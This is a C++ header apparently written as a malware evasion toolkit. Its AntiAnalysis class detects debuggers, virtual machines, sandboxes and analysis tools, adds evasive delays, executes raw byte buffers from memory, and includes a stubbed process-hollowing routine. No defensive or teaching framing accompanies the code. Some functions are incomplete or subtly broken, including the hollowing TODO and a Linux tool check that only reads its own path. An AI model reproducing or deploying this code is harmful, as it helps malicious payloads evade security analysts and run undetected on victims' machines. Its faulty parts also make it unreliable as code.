#pragma once

#include <vector>
#include <cstdint>
#include <cstring>
#include <chrono>
#include <thread>
#include <random>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <signal.h>
#endif

class AntiAnalysis {
private:
    std::mt19937 rng;
    
public:
    AntiAnalysis() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
    
    // Anti-debugging checks
    bool isDebuggerPresent() {
#ifdef _WIN32
        // Multiple Windows anti-debug checks
        if (IsDebuggerPresent()) return true;
        
        BOOL debugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
        if (debugged) return true;
        
        // Check PEB for debugger
        PPEB pPEB = (PPEB)__readgsqword(0x60);
        if (pPEB->BeingDebugged) return true;
        
        // Check for debug ports
        HANDLE hDebugObject = NULL;
        NTSTATUS status = NtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessDebugObjectHandle,
            &hDebugObject,
            sizeof(HANDLE),
            NULL
        );
        if (status == 0x00000000 && hDebugObject) return true;
        
        // Check for common debugger processes
        const wchar_t* debuggers[] = {
            L"ollydbg.exe", L"x64dbg.exe", L"windbg.exe", 
            L"idaq.exe", L"idaq64.exe", L"ida.exe", L"ida64.exe",
            L"immunitydebugger.exe", L"wireshark.exe", L"fiddler.exe",
            L"processhacker.exe", L"procmon.exe", L"procexp.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32W);
            
            if (Process32FirstW(hSnapshot, &pe32)) {
                do {
                    for (const wchar_t* debugger : debuggers) {
                        if (wcsstr(pe32.szExeFile, debugger)) {
                            CloseHandle(hSnapshot);
                            return true;
                        }
                    }
                } while (Process32NextW(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        return false;
#else
        // Linux anti-debug checks
        FILE* f = fopen("/proc/self/status", "r");
        if (!f) return false;
        
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                fclose(f);
                return atoi(line + 10) != 0;
            }
        }
        fclose(f);
        
        // Try ptrace
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
            return true;
        }
        ptrace(PTRACE_DETACH, 0, 1, 0);
        
        return false;
#endif
    }
    
    // Anti-VM detection
    bool isVirtualMachine() {
#ifdef _WIN32
        // Check for VM-specific registry keys
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
            L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            wchar_t value[256];
            DWORD size = sizeof(value);
            if (RegQueryValueExW(hKey, L"0", NULL, NULL, 
                (LPBYTE)value, &size) == ERROR_SUCCESS) {
                if (wcsstr(value, L"VMware") || wcsstr(value, L"VBOX") || 
                    wcsstr(value, L"QEMU") || wcsstr(value, L"VirtualBox")) {
                    RegCloseKey(hKey);
                    return true;
                }
            }
            RegCloseKey(hKey);
        }
        
        // Check CPU features
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        if ((cpuInfo[2] >> 31) & 1) return true; // Hypervisor bit
        
        return false;
#else
        // Linux VM detection
        FILE* f = fopen("/proc/cpuinfo", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "hypervisor")) {
                    fclose(f);
                    return true;
                }
            }
            fclose(f);
        }
        
        // Check DMI info
        f = fopen("/sys/class/dmi/id/product_name", "r");
        if (f) {
            char product[256];
            if (fgets(product, sizeof(product), f)) {
                if (strstr(product, "VirtualBox") || strstr(product, "VMware") ||
                    strstr(product, "QEMU") || strstr(product, "Xen")) {
                    fclose(f);
                    return true;
                }
            }
            fclose(f);
        }
        
        return false;
#endif
    }
    
    // Random delay for timing attack prevention
    void randomDelay() {
        std::uniform_int_distribution<int> dist(1, 999);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
    }
    
    // Micro delay for evasion
    void microDelay() {
        std::uniform_int_distribution<int> dist(1, 100);
        std::this_thread::sleep_for(std::chrono::microseconds(dist(rng)));
    }
    
    // In-memory execution
    bool executeInMemory(const std::vector<uint8_t>& code) {
#ifdef _WIN32
        // Windows in-memory execution
        void* execMem = VirtualAlloc(nullptr, code.size(), 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_READWRITE);
        if (!execMem) return false;
        
        // Copy code to allocated memory
        memcpy(execMem, code.data(), code.size());
        
        // Change memory protection to executable
        DWORD oldProtect;
        if (!VirtualProtect(execMem, code.size(), 
                           PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(execMem, 0, MEM_RELEASE);
            return false;
        }
        
        // Add random delay
        microDelay();
        
        // Execute the code
        ((void(*)())execMem)();
        
        // Clean up
        VirtualFree(execMem, 0, MEM_RELEASE);
        return true;
#else
        // Linux in-memory execution
        void* execMem = mmap(nullptr, code.size(), 
                            PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, 
                            -1, 0);
        if (execMem == MAP_FAILED) return false;
        
        // Copy code to allocated memory
        memcpy(execMem, code.data(), code.size());
        
        // Change memory protection to executable
        if (mprotect(execMem, code.size(), PROT_READ | PROT_EXEC) != 0) {
            munmap(execMem, code.size());
            return false;
        }
        
        // Add random delay
        microDelay();
        
        // Execute the code
        ((void(*)())execMem)();
        
        // Clean up
        munmap(execMem, code.size());
        return true;
#endif
    }
    
    // Process hollowing (Windows only)
#ifdef _WIN32
    bool processHollowing(const std::vector<uint8_t>& payload, 
                         const std::wstring& targetProcess) {
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        // Create suspended process
        if (!CreateProcessW(targetProcess.c_str(), nullptr, nullptr, nullptr,
                           FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            return false;
        }
        
        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }
        
        // TODO: Implement full process hollowing
        // This is a simplified version for demonstration
        
        // Resume thread
        ResumeThread(pi.hThread);
        
        // Clean up
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return true;
    }
#endif
    
    // Anti-sandbox checks
    bool isSandbox() {
#ifdef _WIN32
        // Check for sandbox-specific DLLs
        const wchar_t* sandboxDlls[] = {
            L"sbiedll.dll",     // Sandboxie
            L"dbghelp.dll",     // Some sandboxes
            L"api_log.dll",     // Some sandboxes
            L"dir_watch.dll"    // Some sandboxes
        };
        
        for (const wchar_t* dll : sandboxDlls) {
            if (GetModuleHandleW(dll) != nullptr) {
                return true;
            }
        }
        
        // Check number of processors
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        if (si.dwNumberOfProcessors < 2) return true;
        
        // Check total RAM
        MEMORYSTATUSEX ms;
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        if (ms.ullTotalPhys < 2147483648ULL) return true; // Less than 2GB
        
        return false;
#else
        // Linux sandbox detection
        // Check for limited resources
        struct rlimit rl;
        if (getrlimit(RLIMIT_NPROC, &rl) == 0) {
            if (rl.rlim_cur < 100) return true;
        }
        
        return false;
#endif
    }
    
    // Obfuscated sleep
    void obfuscatedSleep(int milliseconds) {
        auto start = std::chrono::high_resolution_clock::now();
        auto target = start + std::chrono::milliseconds(milliseconds);
        
        // Busy wait with random operations
        while (std::chrono::high_resolution_clock::now() < target) {
            volatile int dummy = 0;
            for (int i = 0; i < (rng() % 1000); i++) {
                dummy += i;
            }
            std::this_thread::yield();
        }
    }
    
    // Check for analysis tools
    bool hasAnalysisTools() {
#ifdef _WIN32
        // Check for analysis tool windows
        const wchar_t* windowNames[] = {
            L"OLLYDBG", L"x64dbg", L"Immunity Debugger",
            L"IDA", L"IDA Pro", L"Wireshark", L"Fiddler",
            L"Process Monitor", L"Process Explorer"
        };
        
        for (const wchar_t* name : windowNames) {
            if (FindWindowW(nullptr, name) != nullptr) {
                return true;
            }
        }
        
        return false;
#else
        // Linux analysis tools check
        const char* tools[] = {
            "gdb", "strace", "ltrace", "radare2", "r2",
            "objdump", "strings", "file", "readelf"
        };
        
        for (const char* tool : tools) {
            char path[256];
            snprintf(path, sizeof(path), "/proc/%d/exe", getpid());
            
            char exe[256] = {0};
            readlink(path, exe, sizeof(exe) - 1);
            
            if (strstr(exe, tool)) {
                return true;
            }
        }
        
        return false;
#endif
    }
};